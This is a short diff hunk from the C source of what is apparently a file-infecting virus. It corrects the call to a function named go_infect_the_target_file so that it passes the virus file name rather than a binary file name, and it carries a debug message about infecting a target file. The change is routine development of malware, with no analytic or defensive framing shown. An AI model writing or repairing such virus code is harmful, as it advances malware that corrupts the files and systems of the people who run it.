@@ -35,7 +35,7 @@ int main(int argc, char *argv[])
 #ifdef DEBUGMODE
     printf("Proceeding to infect the file  with the parameters 'target'=%s, 'binary-file-name'=%s, 'size-of-virus'=%ld.\n",target_file_name,virus_file_name,size_of_virus);
 #endif
-		int success = go_infect_the_target_file(target_file_name, binary_file_name, size_of_virus);
+		int success = go_infect_the_target_file(target_file_name, virus_file_name, size_of_virus);
 
 		if (success)
 		{
